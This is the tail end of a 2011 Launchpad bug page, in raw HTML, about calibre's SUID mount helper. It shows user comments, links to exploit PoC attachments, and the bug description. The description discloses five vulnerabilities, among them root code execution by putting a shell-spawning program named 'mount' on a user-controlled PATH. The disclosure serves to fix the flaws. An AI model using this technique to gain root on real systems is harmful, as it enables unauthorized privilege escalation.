    <div class="comment-text editable-message-text" itemprop="commentText"><p>&quot;I side with Kovid. I admire him for doing this app. Because ever since Red Hat 7 or 8 I keep reading on the open source (not free software!) forums something along the lines of „if you need it — go build it, now p*** off as we&#x27;re doing something cool”. He has gotten up and wrote this which is quite unique at the moment. Also he bothers to keep it updated quite often while most of the open source projects (including corporate backed Open Office for example) stagnate.&quot;</p>
<p>Siddartha - I believe most of the problem was Kovid&#x27;s handling the remediations. I&#x27;m not familiar with Donenfeld (my apologies), but Rosenberg is *often* credited with CVE&#x27;s for his bug hunting abilities. Check the next set of kernel patches - I would wager Rosenberg has three or four to his credit.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">"I side with Kovid. I admire him for doing this app. Because ever since Red Hat 7 or 8 I keep reading on the open source (not free software!) forums something along the lines of „if you need it — go build it, now p*** off as we're doing something cool”. He has gotten up and wrote this which is quite unique at the moment. Also he bothers to keep it updated quite often while most of the open source projects (including corporate backed Open Office for example) stagnate."

Siddartha - I believe most of the problem was Kovid's handling the remediations. I'm not familiar with Donenfeld (my apologies), but Rosenberg is *often* credited with CVE's for his bug hunting abilities. Check the next set of kernel patches - I would wager Rosenberg has three or four to his credit.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/110" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~jake-lwn" class="sprite person">Jake Edge (jake-lwn)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-06T18:30:01.545443+00:00" title="2011-11-06 18:30:01 UTC">on 2011-11-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/110"> #110</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Now that calibre-<wbr />mount-helper has been removed, shouldn&#x27;t the install script look for it and remove it?  That way folks that upgrade won&#x27;t end up with a dangling copy?  Or do I misunderstand how the install/upgrade process goes?</p>
<p>jake</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Now that calibre-mount-helper has been removed, shouldn't the install script look for it and remove it?  That way folks that upgrade won't end up with a dangling copy?  Or do I misunderstand how the install/upgrade process goes?

jake</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/111" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~ystath-afypnish" class="sprite person">gregpuppy (ystath-afypnish)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-07T17:03:28.198568+00:00" title="2011-11-07 17:03:28 UTC">on 2011-11-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/111"> #111</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I have been an avid advocate of calibre among foss circles. Given how things turned up, I would like to apologize to all people that had (possibly) their computers compromised and -in specific- to my friend Zet.</p>
<p>Kudos go to Kovid, Dan and Jason.<br />
I will continue to support and evangelize calibre.</p>
<p>&quot;Only one local exploit in the last 5 years&quot; &lt;3</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I have been an avid advocate of calibre among foss circles. Given how things turned up, I would like to apologize to all people that had (possibly) their computers compromised and -in specific- to my friend Zet.

Kudos go to Kovid, Dan and Jason.
I will continue to support and evangelize calibre.

"Only one local exploit in the last 5 years" &lt;3
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/calibre/+bug/885027/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
        
          <div class="informational message comments-hidden-message">
            Displaying first 40
            and last 40
            comments.
            
              <a class="show-comments-link" href="/calibre/+bug/885027?comments=all">
                View all 111
                comments</a> or <a href="/calibre/+bug/885027?comments=all">add a comment</a>.
            
          </div>
            
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/calibre/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/calibre/+bug/885027/+secrecy">Edit</a>

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    <li class="sprite bug-dupe">
    <span id="mark-duplicate-text">
    <a class="menu-link-mark-dupe" href="/calibre/+bug/885027/+duplicate">Mark as duplicate</a>
    </span>
    </li>
    
    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/calibre/+bug/885027/+create-question">Convert to a question</a></li>
    
    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/calibre/+bug/885027/+addbranch">Link a related branch</a></li>
    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/calibre/+bug/885027/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/calibre/+bug/885027/+unlinkcve">Remove CVE link</a></li>
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/calibre/+bug/885027/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/calibre/+bug/885027/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/calibre/+bug/885027/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  <div class="portlet" id="portlet-patches">
    <h2>Patches</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/calibre/+bug/885027/+attachment/2585968/+files/fix.txt">Final Solution.</a>
        <small>
          (<a href="/calibre/+bug/885027/+attachment/2585968">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/calibre/+bug/885027/+addcomment?field.patch=on">Add patch</a>
      </li>
    </ul>
  </div>
  <div class="portlet" id="portlet-attachments">
    <h2>Bug attachments</h2>
    <ul>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/calibre/+bug/885027/+attachment/2582343/+files/50calibrerassaultmount.sh">exploit PoC</a>
        <small>
          (<a href="/calibre/+bug/885027/+attachment/2582343">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/calibre/+bug/885027/+attachment/2583680/+files/60calibrerassaultmount.sh">exploit PoC 2</a>
        <small>
          (<a href="/calibre/+bug/885027/+attachment/2583680">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/calibre/+bug/885027/+attachment/2583746/+files/60calibrerassaultmount.sh">exploit PoC 2.1</a>
        <small>
          (<a href="/calibre/+bug/885027/+attachment/2583746">edit</a>)
        </small>
      </li>
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/calibre/+bug/885027/+attachment/2584435/+files/70calibrerassaultmount.sh">Yet another exploit</a>
        <small>
          (<a href="/calibre/+bug/885027/+attachment/2584435">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/calibre/+bug/885027/+addcomment">Add attachment</a>
      </li>
    </ul>
  </div>


      <div class="portlet" id="portlet-watches">
  <h2>Remote bug watches</h2>
  <ul>
    <li>
      <span class="sprite bug-remote"></span>
      <a class="link-external" href="https://bugzilla.redhat.com/show_bug.cgi?id=651183">redhat-bugs #651183</a>
      
        <br />[<span>CLOSED ERRATA</span>]
        <a class="sprite edit action-icon" title="Change watch details" href="/bugs/885027/+watch/92262">Edit</a>
    </li>
  </ul>
  <p>Bug watches keep track of this bug in other bug trackers.</p>
</div>

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004-2021
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://twitter.com/launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        r0d8de2b
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/885027", "self_link": "https://bugs.launchpad.net/api/devel/bugs/885027"}, "information_type_data": {"PUBLIC": {"description": "Everyone can see this information.\n", "name": "Public", "is_private": false, "order": 0, "description_css_class": "choice-description", "value": "PUBLIC"}, "PUBLICSECURITY": {"description": "Everyone can see this security related information.\n", "name": "Public Security", "is_private": false, "order": 1, "description_css_class": "choice-description", "value": "PUBLICSECURITY"}, "USERDATA": {"description": "Only shared with users permitted to see private user information.\n", "name": "Private", "is_private": true, "order": 3, "description_css_class": "choice-description", "value": "USERDATA"}, "PRIVATESECURITY": {"description": "Only the security group can see this information.\n ", "name": "Private Security", "is_private": true, "order": 2, "description_css_class": "choice-description", "value": "PRIVATESECURITY"}}, "total_comments_and_activity": 170, "bug_is_private": false, "related_features": {}, "first visible_recent_comment": 71, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/885027", "web_link": "https://bugs.launchpad.net/bugs/885027", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 885027, "private": false, "information_type": "Public Security", "name": null, "title": "SUID Mount Helper has 5 Major Vulnerabilities", "description": "Hello Calibre,\n\nThere are 5 separate vulnerabilities with the calibre SUID mount helper:\n\nThese vulnerabilities concern /src/calibre/devices/linux_mount_helper.c.\n\n1. Ability to create root owned directory anywhere. The mount helper calls mkdir(argv[3], ...) on line 48. \n\n2. Ability to remove any empty directory on the system. For example, line 172.\n\n3. Ability to create and delete user_controlled_dir/.created_by_calibre_mount_helper anywhere on the filesystem, lines 55 and 165.\n\n4. Ability to inject arguments into 'mount' being exec'd. On lines 78, 81, and 83, the final two arguments to mount are user controlled. On lines 1033, 106, 108, 139, and 141, the last argument to unmount/eject is user controlled. The \"exists()\" check can be subverted via race condition or by creating an existing file in the working directory with a filename equal to the desired injected argument.\n\n5. Ability to execute any program as root. The mount helper makes use of execlp on lines 78, 81, 83, 103, 106, 108, 139, and 141, and the first argument does not start with a / character. Because of this, execlp will search PATH for the executable to run. PATH is user controlled, and thus it is trivial to write a program that spawns a shell and give it \"mount\" as a filename, and direct PATH to its directory. A proof of concept of this is attached.\n\nThanks,\nJason Donenfeld", "owner_link": "https://bugs.launchpad.net/api/devel/~zx2c4", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/bug_tasks", "duplicate_of_link": null, "date_created": "2011-11-02T01:21:40.477375+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/subscriptions", "date_last_updated": "2011-11-21T12:41:59.331913+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 402, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/attachments", "security_related": true, "latest_patch_uploaded": "2011-11-05T07:13:45.746483+00:00", "tags": [], "date_last_message": "2011-11-07T17:03:28.198568+00:00", "number_of_duplicates": 0, "message_count": 112, "users_affected_count": 22, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/users_unaffected", "users_affected_count_with_dupes": 22, "other_users_affected_count_with_dupes": 22, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/885027/linked_merge_proposals", "http_etag": "\"49564e6a7c0069bba0fd38fe39abd5ac23ff0e3d-e51dc22e239e20f0e82a60e7eaa3e73ada552e90\""}, "bugtask_data": {"1050867": {"assignee_vocabulary": "AllUserTeamsParticipation", "user_can_unassign": false, "bugtask_path": "/ubuntu/+source/calibre/+bug/885027", "assignee_value": null, "user_can_edit_status": true, "bug_title": "SUID Mount Helper has 5 Major Vulnerabilities", "user_can_edit_milestone": false, "prefix": "ubuntu_calibre", "form_row_id": "task1050867", "target_is_product": false, "user_can_edit_importance": false, "assignee_is_team": null, "delete_link": "https://bugs.launchpad.net/ubuntu/+source/calibre/+bug/885027/+delete", "user_can_edit_assignee": false, "milestone_widget_items": "[]", "status_widget_items": "[]", "status_value": "Invalid", "importance_value": "Undecided", "hide_assignee_team_selection": true, "user_can_delete": false, "row_id": "tasksummary1050867", "assignee_vocabulary_filters": [], "targetname": "calibre (Ubuntu)", "importance_widget_items": "[]", "milestone_value": null, "id": 1050867}, "1050389": {"assignee_vocabulary": "AllUserTeamsParticipation", "user_can_unassign": false, "bugtask_path": "/calibre/+bug/885027", "assignee_value": null, "user_can_edit_status": true, "bug_title": "SUID Mount Helper has 5 Major Vulnerabilities", "user_can_edit_milestone": false, "prefix": "calibre", "form_row_id": "task1050389", "target_is_product": true, "user_can_edit_importance": false, "assignee_is_team": null, "delete_link": "https://bugs.launchpad.net/calibre/+bug/885027/+delete", "user_can_edit_assignee": false, "milestone_widget_items": "[]", "status_widget_items": "[]", "status_value": "Fix Released", "importance_value": "Undecided", "hide_assignee_team_selection": true, "user_can_delete": false, "row_id": "tasksummary1050389", "assignee_vocabulary_filters": [], "targetname": "calibre", "importance_widget_items": "[]", "milestone_value": null, "id": 1050389}}, "context": {"self_link": "https://bugs.launchpad.net/api/devel/calibre/+bug/885027", "web_link": "https://bugs.launchpad.net/calibre/+bug/885027", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/885027", "milestone_link": null, "status": "Fix Released", "importance": "Undecided", "assignee_link": null, "bug_target_display_name": "calibre", "bug_target_name": "calibre", "bug_watch_link": null, "date_assigned": null, "date_created": "2011-11-02T01:21:40.477375+00:00", "date_confirmed": "2011-11-02T12:45:34.416968+00:00", "date_incomplete": null, "date_in_progress": "2011-11-04T20:27:13.269707+00:00", "date_closed": "2011-11-04T20:27:13.269707+00:00", "date_left_new": "2011-11-02T05:51:13.914452+00:00", "date_triaged": "2011-11-04T20:27:13.269707+00:00", "date_fix_committed": "2011-11-04T20:27:13.269707+00:00", "date_fix_released": "2011-11-04T20:27:13.269707+00:00", "date_left_closed": "2011-11-04T19:13:12.213443+00:00", "owner_link": "https://bugs.launchpad.net/api/devel/~zx2c4", "target_link": "https://bugs.launchpad.net/api/devel/calibre", "title": "Bug #885027 in calibre: \"SUID Mount Helper has 5 Major Vulnerabilities\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/calibre/+bug/885027/related_tasks", "is_complete": true, "http_etag": "\"517c8d59a5cb8e5f56ee449308c3121ead12cf4a-6610ca0ee5744ea137c409ed66bee6d8855b54be\""}, "initial_comment_batch_offset": 41};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 77 queries/external actions issued in 1.73 seconds

    Features: {'app.maintenance_message': None, 'visible_render_time': None, 'bugs.affected_count_includes_dupes.disabled': None, 'app.mainsite_only.canonical_url': None, 'disclosure.dsp_picker.enabled': 'on', 'bugs.nominations.bug_supervisors_can_target': 'on', 'baselayout.careers_link.disabled': None, 'hard_timeout': '9000', 'js.yui_version': None, 'profiling.enabled': None}

    r0d8de2b

    -->

</html>

